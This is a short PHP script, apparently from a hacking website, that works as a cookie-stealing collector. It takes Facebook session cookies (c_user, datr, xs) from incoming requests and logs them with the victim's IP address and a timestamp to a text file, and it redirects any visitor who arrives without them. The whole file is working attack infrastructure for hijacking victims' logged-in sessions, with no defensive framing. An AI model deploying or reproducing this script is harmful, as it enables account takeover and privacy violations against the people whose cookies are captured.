#20th Jan,2015
#author:Rashid feroz[rashid.2008feroz@gmail.com]
#website:Hackwhiz.com


<?php

$c_user=$_REQUEST['c_user'];
$datr=$_REQUEST['datr'];
$xs=$_REQUEST['xs'];

if(!empty($c_user))
{
$myfile=fopen("cookie.txt",'a+');
$date= date("d-m-Y h:i:sa");
$client_ip=$_SERVER['REMOTE_ADDR'];

fwrite($myfile,$date."\n");
fwrite($myfile,"Client ip = ".$client_ip."\n");
fwrite($myfile,"c_user = ".$c_user."\n");
fwrite($myfile,"datr = ".$datr."\n");
fwrite($myfile,"xs = ".$xs."\n");
fwrite($myfile,"   ----------------------------------\n\n");
fclose($myfile);

}
else{
    header('location:http://your-website.com'); 
}

?>